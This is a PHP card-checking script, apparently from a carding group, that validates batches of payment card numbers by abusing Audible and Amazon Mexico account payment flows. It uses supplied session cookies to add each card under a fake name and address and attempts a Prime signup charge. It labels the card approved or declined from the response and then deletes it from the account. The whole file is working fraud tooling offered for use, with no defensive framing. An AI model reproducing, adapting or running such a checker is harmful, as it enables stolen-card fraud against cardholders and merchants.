<?php

ignore_user_abort();
error_reporting(0);
session_start();
$time = time();

#########################################################################
// base (amazon) by: @𝖇𝖚𝖑𝖑𝖐𝖎𝖓𝖈𝖍𝖊𝖈𝖐𝖊𝖗𝖘
#############################################################################
ini_set('memory_limit', '-1');

function multiexplode($delimiters, $string)
{
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}
function getStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
function inStr($string, $start, $end, $value)
{
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}

function replace_unicode_escape_sequence($match)
{return mb_convert_encoding(pack('H*', $match[1]), 'UTF-8', 'UCS-2BE');}
function unicode_decode($str)
{return preg_replace_callback('/\\\\u([0-9a-f]{4})/i', 'replace_unicode_escape_sequence', $str);}
$delemitador = array("|", ";", "", "", " ", " ", ">", "<");

$lista = str_replace(array(" "), '', $_GET['lista']);
$regex = str_replace(array('', ";", "|", ",", "=>", "-", " ", '', '|||'), "|", $lista);

$lista = $_GET['lista'];
$cc    = multiexplode(array("|", ";", ":", "/", "»", "«", ">", "<"), $lista)[0];
$mes   = multiexplode(array("|", ";", ":", "/", "»", "«", ">", "<"), $lista)[1];
$ano   = multiexplode(array("|", ";", ":", "/", "»", "«", ">", "<"), $lista)[2];
$cvv   = multiexplode(array("|", ";", ":", "/", "»", "«", ">", "<"), $lista)[3];

$mes    = intval($mes);
$parte1 = substr($cc, 0, 4);
$parte2 = substr($cc, 4, 4);
$parte3 = substr($cc, 8, 4);
$parte4 = substr($cc, 12, 4);

$json_str = file_get_contents('bins.json');
$bins     = json_decode($json_str, true);
$bin      = substr($cc, 0, 6);
if (isset($bins[$bin])) {

    $a = json_encode($bins[$bin]);

    $bandeira = getStr($a, 'bandeira":"', '"');
    $nivel    = getstr($a, 'level":"', '"');
    $bank     = getStr($a, 'banco":"', '"');
    $pais     = getstr($a, 'pais":"', '"');
    $puxad    = " $bandeira$nivel $bank $pais";
} else {

function bin ($cc){
$contents = file_get_contents("bins.csv");
$pattern = preg_quote(substr($cc, 0, 6), '/');
$pattern = "/^.*$pattern.*\$/m";
if (preg_match_all($pattern, $contents, $matches)) {
$encontrada = implode("\n", $matches[0]);
}
$pieces = explode(";", $encontrada);
return "$pieces[1] $pieces[2] $pieces[3] $pieces[4] $pieces[5]";
}
$bin = bin($lista);
}

function generateRandomString($length = 12)
{
    $characters       = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}


#################################################
// by: tropa

$bin_vtx = substr($cc, 0, 8);

$mail1 = 'ee' . generateRandomString(19) . '@gmail.com';

$cookieDir = $_POST['cookie1'];
$cookie = $_POST['cookie2'];

#############################################################################
$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL            => 'https://www.audible.com/account/payments?ref=',
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_COOKIE         => $cookieDir,
    CURLOPT_ENCODING       => "gzip",
    CURLOPT_HTTPHEADER     => array(
        'Host: www.audible.com',
        'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"',
        'sec-ch-ua-mobile: ?0',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Sec-GPC: 1',
        'Accept-Language: pt-BR,pt;q=0.6',
    ),

]);
$r     = curl_exec($ch);
$csrtf = getStr($r, 'name="csrfToken" value="', '"');

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL            => 'https://www.audible.com/unified-payment/update-payment-instrument?requestUrl=https%3A%2F%2Fwww.audible.com%2Faccount%2Fpayments%3Fref%3D&relativeUrl=%2Faccount%2Fpayments&',
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_COOKIE         => $cookieDir,
    CURLOPT_ENCODING       => "gzip",
    CURLOPT_POSTFIELDS     => "isSubsConfMosaicMigrationEnabled=false&destinationUrl=%2Funified%2Fpayments%2Fmfa&transactionType=Recurring&unifiedPaymentWidgetView=true&paymentPreferenceName=Audible&clientId=audible&isAlcFlow=false&isConsentRequired=false&selectedMembershipBillingPaymentConfirmButton=adbl_accountdetails_mfa_required_credit_card_freetrial_error&selectedMembershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_purchasehistory_mfa_verification&membershipBillingNoBillingDescriptionKey=adbl_order_redrive_membership_no_billing_desc_key&membershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_billing_payments_list_desc_key&keepDialogOpenOnSuccess=false&isMfaCase=false&paymentsListChooseTextKey=adbl_accountdetails_select_default_payment_method&confirmSelectedPaymentDescriptionKey=&confirmButtonTextKey=adbl_paymentswidget_list_confirm_button&paymentsListDescriptionKey=adbl_accountdetails_manage_payment_methods_description&paymentsListTitleKey=adbl_accountdetails_manage_payment_methods&selectedPaymentDescriptionKey=&selectedPaymentTitleKey=adbl_paymentswidget_selected_payment_title&viewAddressDescriptionKey=&viewAddressTitleKey=adbl_paymentswidget_view_address_title&addAddressDescriptionKey=&addAddressTitleKey=adbl_paymentswidget_add_address_title&showEditTelephoneField=false&viewCardCvvField=false&editBankAccountDescriptionKey=&editBankAccountTitleKey=adbl_paymentswidget_edit_bank_account_title&addBankAccountDescriptionKey=&addBankAccountTitleKey=&editPaymentDescriptionKey=&editPaymentTitleKey=&addPaymentDescriptionKey=adbl_paymentswidget_add_payment_description&addPaymentTitleKey=adbl_paymentswidget_add_payment_title&editCardDescriptionKey=&editCardTitleKey=adbl_paymentswidget_edit_card_title&defaultPaymentMethodKey=adbl_accountdetails_default_payment_method&useAsDefaultCardKey=adbl_accountdetails_use_as_default_card&geoBlockAddressErrorKey=adbl_paymentswidget_payment_geoblocked_address&geoBlockErrorMessageKey=adbl_paymentswidget_geoblock_error_message&geoBlockErrorHeaderKey=adbl_paymentswidget_geoblock_error_header&addCardDescriptionKey=adbl_paymentswidget_add_card_description&addCardTitleKey=adbl_paymentswidget_add_card_title&ajaxEndpointPrefix=&geoBlockSupportedCountries=&enableGeoBlock=false&setDefaultOnSelect=true&makeDefaultCheckboxChecked=false&showDefaultCheckbox=false&autoSelectPayment=false&showConfirmButton=false&showAddButton=true&showDeleteButtons=true&showEditButtons=true&showClosePaymentsListButton=false&isVerifyCvv=false&isDialog=false&selectPaymentOnSuccess=false&ref=a_accountPayments_c3_edit&paymentType=CreditCard&addCreditCardNumber=$parte1%20$parte2%20$parte3%20$parte4&expirationMonth=$mes&expirationYear=$ano&fullName=pedro%20sosa&csrfToken=" . urlencode($csrtf) . "&country=US&addressLine1=1494%20Linne%20D&addressLine2=&zipCode=47546&state=IN&city=JASPER&useAsDefault=true&addressId=&accountHolderName=pedro%20sosa",
    CURLOPT_HTTPHEADER     => array(
        'Host: www.audible.com',
        'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"',
        'Content-type: application/x-www-form-urlencoded',
        'adpToken: ',
        'X-Requested-With: XMLHttpRequest',
        'sec-ch-ua-mobile: ?0',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'sec-ch-ua-platform: "Windows"',
        'Accept: */*',
        'Sec-GPC: 1',
        'Accept-Language: pt-BR,pt;q=0.6',
        'Origin: https://www.audible.com',
        'Referer: https://www.audible.com/account/payments?ref=',
    ),
]);
$getai = curl_exec($ch);

$card_id2 = getStr($getai, '"paymentId":"', '"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.com.mx/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_COOKIE, $cookie);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: www.amazon.com.mx',
    'device-memory: 8',
    'sec-ch-device-memory: 8',
    'dpr: 1',
    'sec-ch-dpr: 1',
    'viewport-width: 1920',
    'sec-ch-viewport-width: 1920',
    'rtt: 100',
    'downlink: 10',
    'ect: 4g',
    'sec-ch-ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'Upgrade-Insecure-Requests: 1',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    'Service-Worker-Navigation-Preload: true',
    'Referer: https://www.amazon.com.br/gp/css/homepage.html?ref_=nav_AccountFlyout_ya',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',

));
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$removercartaoget = curl_exec($ch);

$session_id   = getStr($removercartaoget, '"sessionId":"', '"');
$token_delete = getStr($removercartaoget, '"serializedState":"', '"');
$ppwiidq      = getStr($removercartaoget, 'elementDOMEventMethodBindings":[],"data":{"instrumentId":"', '"');
$customerID   = getStr($removercartaoget, '"customerID":"', '"');
$ppwiid       = getStr($removercartaoget, '"data":{"selectedInstrumentId":"', '"');

$url = "https://www.amazon.com.mx/gp/prime/pipeline/membersignup";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
    "Host: www.amazon.com.mx",
    "Cookie: $cookie",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "viewport-width: 1536",
    "content-type: application/x-www-form-urlencoded",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
curl_setopt($curl, CURLOPT_POSTFIELDS, "clientId=debugClientId&ingressId=PrimeDefault&primeCampaignId=PrimeDefault&redirectURL=gp%2Fhomepage.html&benefitOptimizationId=default&planOptimizationId=default&inline=1&disableCSM=1");
$post_verify = curl_exec($curl);

$token_verify = getStr($post_verify, 'name="ppw-widgetState" value="', '"');
$offerToken   = getStr($post_verify, 'name="offerToken" value="', '"');

$url = "https://www.amazon.com.mx/payments-portal/data/widgets2/v1/customer/$customerID/continueWidget";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
    "Host: www.amazon.com.mx",
    "Cookie: $cookie",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "viewport-width: 1536",
    "content-type: application/x-www-form-urlencoded; charset=UTF-8",
    "accept: application/json, text/javascript, */*; q=0.01",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
curl_setopt($curl, CURLOPT_POSTFIELDS, "ppw-jsEnabled=true&ppw-widgetState=$token_verify&ppw-widgetEvent=SavePaymentPreferenceEvent");
$post_verify2 = curl_exec($curl);

$url = "https://www.amazon.com.mx/hp/wlp/pipeline/actions";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_HEADER, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
    "Host: www.amazon.com.mx",
    "Cookie: $cookie",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "viewport-width: 1536",
    "content-type: application/x-www-form-urlencoded",
    "accept: */*",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
curl_setopt($curl, CURLOPT_POSTFIELDS, "offerToken=$offerToken&session-id=$session_id&wlpLocation=prime_default&paymentsPortalPreferenceType=PRIME&paymentsPortalExternalReferenceID=prime&paymentMethodId=$card_id2&isHorizonteFlow=1&actionPageDefinitionId=WLPAction_AcceptOffer_HardVet");
$tropa = curl_exec($curl);

// as reqs abaixo remove o cartao (delete)
$ch = curl_init();
curl_setopt_array($ch, [ CURLOPT_URL => 'https://www.audible.com/account/payments',
    CURLOPT_RETURNTRANSFER => true, 
    CURLOPT_SSL_VERIFYPEER => false, 
    CURLOPT_FOLLOWLOCATION => true, 
    CURLOPT_COOKIE => $cookieDir, 
    CURLOPT_ENCODING => "gzip", 
    CURLOPT_HTTPHEADER => array( 'Host: www.audible.com', 'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"', 'sec-ch-ua-mobile: ?0', 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36', 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8', 'Sec-GPC: 1', 'Accept-Language: pt-BR,pt;q=0.6', ), ]); 
$r = curl_exec($ch); 
$csrtf = getStr($r, 'data-csrf-token="', '"');

$andressid = getStr($r, 'data-billing-address-id="', '"'); 

$ch = curl_init();
curl_setopt_array($ch, [ CURLOPT_URL => 'https://www.audible.com/unified-payment/deactivate-payment-instrument?requestUrl=https%3A%2F%2Fwww.audible.com%2Faccount%2Fpayments&relativeUrl=%2Faccount%2Fpayments&', 
    CURLOPT_RETURNTRANSFER => true, 
    CURLOPT_SSL_VERIFYPEER => false, 
    CURLOPT_FOLLOWLOCATION => true, 
    CURLOPT_COOKIE => $cookieDir, 
    CURLOPT_ENCODING => "gzip", 
    CURLOPT_POSTFIELDS => 'isSubsConfMosaicMigrationEnabled=false&destinationUrl=%2Funified%2Fpayments%2Fmfa&transactionType=Recurring&unifiedPaymentWidgetView=true&paymentPreferenceName=Audible&clientId=audible&isAlcFlow=false&isConsentRequired=false&selectedMembershipBillingPaymentConfirmButton=adbl_accountdetails_mfa_required_credit_card_freetrial_error&selectedMembershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_purchasehistory_mfa_verification&membershipBillingNoBillingDescriptionKey=adbl_order_redrive_membership_no_billing_desc_key&membershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_billing_payments_list_desc_key&keepDialogOpenOnSuccess=false&isMfaCase=false&paymentsListChooseTextKey=adbl_accountdetails_select_default_payment_method&confirmSelectedPaymentDescriptionKey=&confirmButtonTextKey=adbl_paymentswidget_list_confirm_button&paymentsListDescriptionKey=adbl_accountdetails_manage_payment_methods_description&paymentsListTitleKey=adbl_accountdetails_manage_payment_methods&selectedPaymentDescriptionKey=&selectedPaymentTitleKey=adbl_paymentswidget_selected_payment_title&viewAddressDescriptionKey=&viewAddressTitleKey=adbl_paymentswidget_view_address_title&addAddressDescriptionKey=&addAddressTitleKey=adbl_paymentswidget_add_address_title&showEditTelephoneField=false&viewCardCvvField=false&editBankAccountDescriptionKey=&editBankAccountTitleKey=adbl_paymentswidget_edit_bank_account_title&addBankAccountDescriptionKey=&addBankAccountTitleKey=&editPaymentDescriptionKey=&editPaymentTitleKey=&addPaymentDescriptionKey=adbl_paymentswidget_add_payment_description&addPaymentTitleKey=adbl_paymentswidget_add_payment_title&editCardDescriptionKey=&editCardTitleKey=adbl_paymentswidget_edit_card_title&defaultPaymentMethodKey=adbl_accountdetails_default_payment_method&useAsDefaultCardKey=adbl_accountdetails_use_as_default_card&geoBlockAddressErrorKey=adbl_paymentswidget_payment_geoblocked_address&geoBlockErrorMessageKey=adbl_paymentswidget_geoblock_error_message&geoBlockErrorHeaderKey=adbl_paymentswidget_geoblock_error_header&addCardDescriptionKey=adbl_paymentswidget_add_card_description&addCardTitleKey=adbl_paymentswidget_add_card_title&ajaxEndpointPrefix=&geoBlockSupportedCountries=&enableGeoBlock=false&setDefaultOnSelect=true&makeDefaultCheckboxChecked=false&showDefaultCheckbox=false&autoSelectPayment=false&showConfirmButton=false&showAddButton=true&showDeleteButtons=true&showEditButtons=true&showClosePaymentsListButton=false&isDialog=false&isVerifyCvv=false&ref=a_accountPayments_c3_0_delete&paymentId=' . $card_id2 . '&billingAddressId=' . $andressid . '&paymentType=CreditCard&tail=2720&accountHolderName=dasda&isValid=true&isDefault=true&issuerName=Visa&displayIssuerName=Visa&bankName=&csrfToken=' . urlencode($csrtf) . '&index=0&consentState=OptedIn', 
    CURLOPT_HTTPHEADER => array( 'Host: www.audible.com', 'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"', 'Content-type: application/x-www-form-urlencoded', 'adpToken: ', 'X-Requested-With: XMLHttpRequest', 'sec-ch-ua-mobile: ?0', 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36', 'sec-ch-ua-platform: "Windows"', 'Accept: */*', 'Sec-GPC: 1', 'Accept-Language: pt-BR,pt;q=0.6', 'Origin: https://www.audible.com', 'Referer: https://www.audible.com/account/payments?ref=', ), ]); 
$tropalindo = curl_exec($ch);

$maxattemps = 1; 
$attemps = 0; 
$success = false;

 while ($attemps < $maxattemps && !$success) {
if (strpos($tropalindo, 'adbl_paymentswidget_delete_payment_success')) { 
$success = true; 
$msg = '✅'; 
$err = "removido: $msg $err1";
 } else {
$msg = '❌';
 $err = "removido: $msg $err1"; 
 } 
 $attemps++; 
 sleep(1);

}
 if (strpos($tropa, 'BILLING_ADDRESS_RESTRICTED')) {

    echo "<font style=color:##00FF00><span class='badge badge-soft-success'>Aprovadas </span> ➔ $cc|$mes|$ano|$cvv</font>➜REMOVIDO:$msg<font style=color:#9C3E9B>$nome</font> ➜ <font style=color:#9C3E9B>$bin ➔ Retorno: <span class='badge badge-soft-success'>[💸🟢CARTÃO DEBITOU🟢]</span><b>Tempo de Resposta: (" . (time() - $time) . " SEG) ➔ @𝖇𝖚𝖑𝖑𝖐𝖎𝖓𝖈𝖍𝖊𝖈𝖐𝖊𝖗𝖘</b></font><br>";
} elseif (strpos($tropa, 'InvalidInput')) {
    
    echo "<font style=color:#9C3E9B><span class='badge badge-soft-danger'>Reprovadas </span> ➔ $cc|$mes|$ano|$cvv</font>➜REMOVIDO:$msg<font style=color:#9C3E9B>$nome</font> ➜ <font style=color:#9C3E9B>$bin ➔ Retorno: <span class='badge badge-soft-danger'>[ ❌Relogue Site amazon ou Cartão invalido❌ ] </span><b>Tempo de Resposta: (" . (time() - $time) . " SEG) ➔ @𝖇𝖚𝖑𝖑𝖐𝖎𝖓𝖈𝖍𝖊𝖈𝖐𝖊𝖗𝖘</b></font><br>";
    curl_close($curl);
    exit();

} elseif (strpos($tropa, 'HARDVET_VERIFICATION_FAILED')) {

    echo "<font style=color:#9C3E9B><span class='badge badge-soft-danger'>Reprovadas </span> ➔ $cc|$mes|$ano|$cvv</font>➜REMOVIDO:$msg<font style=color:#9C3E9B>$nome</font> ➜ <font style=color:#9C3E9B>$bin ➔ Retorno: <span class='badge badge-soft-warning'>[CARTAO RECUSADO]</span><b>Tempo de Resposta: (" . (time() - $time) . " SEG) ➔ @𝖇𝖚𝖑𝖑𝖐𝖎𝖓𝖈𝖍𝖊𝖈𝖐𝖊𝖗𝖘</b></font><br>";
    curl_close($curl);
    exit();
} else {
    echo "<font style=color:#9C3E9B><span class='badge badge-soft-danger'>Reprovadas </span> ➔ $cc|$mes|$ano|$cvv</font>➜REMOVIDO:$msg<font style=color:#9C3E9B>$nome</font> ➜ <font style=color:#9C3E9B>$bin ➔ Retorno: <span class='badge badge-soft-danger'>[❌COOKIES DESATUALIZADO❌]</span><b>Tempo de Resposta: (" . (time() - $time) . " SEG) ➔ @𝖇𝖚𝖑𝖑𝖐𝖎𝖓𝖈𝖍𝖊𝖈𝖐𝖊𝖗𝖘</b></font><br>";
    curl_close($curl);
    exit();

        

             #   }
                }